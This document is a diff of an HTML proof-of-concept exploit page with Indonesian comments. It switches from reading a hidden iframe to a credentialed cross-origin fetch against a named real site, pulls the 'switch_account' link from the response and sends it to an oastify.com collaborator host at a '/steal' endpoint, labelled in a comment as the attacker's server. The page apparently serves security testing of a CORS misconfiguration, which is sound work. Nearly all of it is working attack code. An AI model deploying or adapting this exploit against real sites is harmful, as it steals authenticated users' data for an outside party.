@@ -1,35 +1,32 @@
-<!DOCTYPE html>
 <html>
 <head>
-    <title>POC - Ambil Link dari iframe</title>
+    <title>POC - Ambil Link dengan CORS</title>
 </head>
 <body>
-    <h1>POC - Ambil Link dari iframe</h1>
-    <iframe id="targetFrame" src="https://airflow.soundcloud.org" style="display:none;"></iframe>
+    <h1>POC - Ambil Link dengan CORS</h1>
     <script>
-        // Tunggu hingga iframe dimuat
-        document.getElementById('targetFrame').onload = function() {
-            try {
-                // Akses dokumen dari iframe
-                var iframeDocument = document.getElementById('targetFrame').contentDocument || document.getElementById('targetFrame').contentWindow.document;
-
-                // Ambil link dengan id switch_account
-                var linkElement = iframeDocument.getElementById('switch_account');
-                if (linkElement) {
-                    var linkHref = linkElement.href;
-
-                    // Kirim link ke server penyerang
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("GET", "http://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?link=" + encodeURIComponent(linkHref), true);
-                    xhr.send();
-                } else {
-                    console.log("Element dengan id 'switch_account' tidak ditemukan.");
-                }
-            } catch (e) {
-                console.log("Gagal mengambil link:", e);
+        fetch('https://airflow.soundcloud.org', {
+            credentials: 'include'
+        })
+        .then(response => response.text())
+        .then(data => {
+            var parser = new DOMParser();
+            var doc = parser.parseFromString(data, 'text/html');
+            var linkElement = doc.getElementById('switch_account');
+            if (linkElement) {
+                var linkHref = linkElement.href;
+                // Kirim link ke server penyerang
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?link=" + encodeURIComponent(linkHref), true);
+                xhr.send();
+            } else {
+                console.log("Element dengan id 'switch_account' tidak ditemukan.");
             }
-        };
+        })
+        .catch(error => console.log("Gagal mengambil link:", error));
     </script>
 </body>
 </html>
+
+
 
